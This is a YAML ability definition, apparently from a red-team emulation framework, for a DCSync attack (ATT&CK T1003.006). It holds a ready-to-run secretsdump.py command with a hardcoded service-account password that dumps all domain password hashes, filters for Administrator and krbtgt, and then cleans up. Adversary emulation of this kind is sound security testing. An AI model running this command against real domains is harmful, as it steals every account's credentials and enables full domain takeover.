- id: ca07-dcsync
  name: DCSync - Dump All Domain Hashes
  description: Use repl_svc DCSync rights to dump all domain account password hashes
  tactic: credential-access
  technique:
    attack_id: T1003.006
    name: OS Credential Dumping - DCSync
  platforms:
    linux:
      sh:
        command: |
          secretsdump.py cyberstrike.mil/repl_svc:Repl1cate!@10.0.20.101 -outputfile /tmp/domain_dump 2>/dev/null; grep -E 'Administrator|krbtgt|ansible' /tmp/domain_dump.ntds 2>/dev/null | head -10 || echo 'DCSync attempted'
        cleanup: |
          rm -f /tmp/domain_dump.*
  singleton: false
  repeatable: false
